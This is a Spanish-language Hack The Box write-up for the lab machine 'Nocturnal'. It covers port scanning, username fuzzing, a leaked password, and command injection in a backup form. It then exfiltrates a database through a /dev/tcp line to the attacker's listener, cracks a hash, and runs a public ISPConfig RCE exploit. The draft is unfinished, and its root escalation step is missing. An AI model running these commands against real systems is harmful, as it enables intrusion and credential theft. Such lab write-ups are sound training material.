# 💤 Nocturnal – Hack The Box

![HTB Logo](img/htb_logo.png)

## Información
- **Dificultad:** Easy
- **Sistema Operativo:** Linux 🐧
- **Categoría:** Web / Privilege Escalation

---

## 📑 Tabla de Contenido
- [Reconocimiento](#1-reconocimiento)
- [Enumeración Web](#2-enumeración-web)
- [Acceso a ISPConfig](#3-acceso-al-panel-ispconfig)
- [Explotación](#4-explotación-ispconfig)
- [Reverse Shell](#5-reverse-shell)
- [Movimiento lateral](#6-movimiento-lateral)
- [Escalada de privilegios](#7-escalada-de-privilegios)
- [Flags](#8-flags)
- [Resumen Final](#-resumen-final)

---

## 1. Reconocimiento

### Escaneo de puertos
```bash
nmap -p- --min-rate 5000 -sS -vvv -n -Pn 10.10.11.64 -oG ports
```
 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
 Host: 10.10.11.64 ()    Status: Up
 Host: 10.10.11.64 ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
 # Nmap done at Mon Aug 18 18:48:19 2025 -- 1 IP address (1 host up) scanned in 20.03 seconds

Puertos encontrados:
- **22/tcp** – OpenSSH  
- **80/tcp** – Apache / página web  


### Escaneo de servicios
```bash
nmap -sCV -p22,80 10.10.11.64 -oN targeted
```
File: targeted
────────────────────────────────────────────────────────────────────────────────────────────────
# Nmap 7.94SVN scan initiated Mon Aug 18 18:49:15 2025 as: nmap -p22,80 -sCV -oN targeted 10.10.
Nmap scan report for 10.10.11.64
Host is up (0.32s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 18 18:49:35 2025 -- 1 IP address (1 host up) scanned in 20.36 seconds
---

## 2. Enumeración Web

En el puerto 80 hay referencias a `nocturnal.htb`.  
Agregamos al `/etc/hosts`:

```
10.10.11.64 nocturnal.htb
```
## 3. Acceso a la pagina del puerto 80
- Nos logueamos 
- Nos permite cargar un archivo
- Intentamos cargar un hola.txt y lo interceptamos con Burpsuite.
img/upload_txt_burp.png

- Luego probamos cambiar el .txt por .pdf 
- Nos muestra

Ya que no podemos hacer nada con ese archivo mas que cargarlo vamos a utilizar la herramienta wfuzz

```bash
wfuzz -c --hw 243 -w  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -b 'PHPSESSID=r2et0njleqapl778k9t2ghplmg' 'http://nocturnal.htb/view.php?username=FUZZ&file=hola.pdf'
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://nocturnal.htb/view.php?username=FUZZ&file=hola.pdf
Total requests: 8295455

=================================================================
ID           Response   Lines    Word       Chars       Payload  
=================================================================

000000039:   200        128 L    248 W      3106 Ch     "jason"  
000000006:   200        128 L    253 W      3457 Ch     "john"   
000000002:   200        128 L    247 W      3037 Ch     "admin"  
000000106:   200        128 L    248 W      3110 Ch     "letmein"
000000154:   200        128 L    248 W      3108 Ch     "hello"  
000000194:   200        128 L    248 W      3113 Ch     "amanda" 

- Vemos un usuario amanda que es el que nos interesa.
- Ponemos en el repeater de Burp username=amanda y veremos lo siguiente.
- Mostrai img

- Nos descargamos el archivo .odt
- Lo descomprimimos con unzip
- Luego filtramos asi:
```bash
 grep -iE 'pass|pwd|user|login|cred|secret|ssh|key|db|mysql|postgres' -R .
```
- Y nos muestra:
Amanda Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J.
- Vamos al panel de login de la web
- Ingresamos con el usuario amanda y passwd arHkG7HAI68X8s1J
- Nos permite  ir a Go To Admin Panel
- Ahi si observamos a detalle el archivo admin.php nos muestra:
```php
command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```
- En la parte de abajo en crear backup ponemos una letra le damos enter y lo interceptamos con burp
  Luego lo mostramos

- Probaremos con whoami o algun comando para ver si luego nos podemos ejecutar una bash
- pondremos imagenes



-nc -nlvp 4444 > nocturnal.db para escuchar
Y de la maquina victima haremos un cat nocturnal_database.db > /dev/tcp/10.10.15.0/4444
Y recibiremos una conexion

luego con 
```bash
sqlite3 nocturnal.db -table
```
entramos a sqlite3 
.tables
- uploads users
select * from users;
| tobias    | 55c82b1ccd55ab219b3b109b07d5061d |

Nos sale el usuario tobias y la passwd en formato hash 
- Metemos el hash en hash.txt
- cat hash.txt
─────┬────────────────────────────────────────
     │ File: hash.txt
─────┼────────────────────────────────────────
 1   │ tobias:55c82b1ccd55ab219b3b109b07d5061d

- Y con la herramienta john
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-MD5
```
Luego con la passwd ingresaremos mediante ssh
```bash
ssh tobias@10.10.11.64
password:slowmotionapocaly***

tobias@nocturnal:~$ ls
user.txt
```

El fuzzing muestra que el panel de **ISPConfig** corre en el puerto 8080.

---

## 3. Acceso al panel ISPConfig

Hacemos un túnel SSH:
```bash
ssh -N -L 18080:127.0.0.1:8080 tobias@10.10.11.64
```

Accedemos en:  
`http://127.0.0.1:18080/`

Credenciales válidas:
```
admin : slowmotionapocalypse
```

![ISPConfig Login](img/ispconfig_login.png)

---

## 4. Explotación ISPConfig

Usamos un exploit público de **ISPConfig Authenticated RCE**:

```bash
python3 exploit.py http://127.0.0.1:18080 admin slowmotionapocalypse

git clone https://github.com/bipbopbup/CVE-2023-46818-python-exploit.git -q

cd CVE-2023-46818-python-exploit

python3 exploit.py http://127.0.0.1:18080 admin slowmotionapocalypse
```

Esto inyecta un webshell → acceso como **www-data**.

Ahora somos root y podemos extraer la flag de /root/root.txt


---



---

## 🔗 Resumen Final

Cadena de ataque:

```
Nmap → ISPConfig panel → Creds admin
   → Exploit RCE → www-data
   → Tobias → PrivEsc → Root
```

![Attack Chain](img/attack_chain.png)

---

✍️ Writeup realizado por juanc 
